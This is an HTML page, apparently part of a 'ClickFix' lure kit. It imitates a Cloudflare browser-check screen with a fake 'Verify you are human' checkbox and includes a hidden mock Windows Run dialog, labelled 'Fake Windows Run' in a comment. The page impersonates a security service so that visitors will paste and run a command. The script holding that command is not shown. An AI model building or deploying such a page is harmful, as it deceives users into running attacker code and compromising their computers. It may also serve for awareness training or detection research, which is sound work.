<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Checking your browser</title>
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="run-popup.css">
</head>

<body>

<div class="browser">

<div class="cf-box">

<h2>Checking your browser before accessing example.com</h2>

<p>This process is automatic. Your browser will redirect shortly.</p>

<label class="captcha">
<input type="checkbox" id="verify">
<span>Verify you are human</span>
</label>

<div id="status"></div>

<p class="footer">Performance & security by Cloudflare</p>

</div>

</div>

<!-- Fake Windows Run -->

<div id="runBox" class="runBox hidden">

<div class="runHeader">Run</div>

<div class="runContent">

<p>Type the name of a program, folder, document, or Internet resource.</p>

<input id="runInput">

<div class="buttons">

<button onclick="closeRun()">Cancel</button>
<button>OK</button>

</div>

</div>

</div>

<script src="script.js"></script>

</body>
</html>
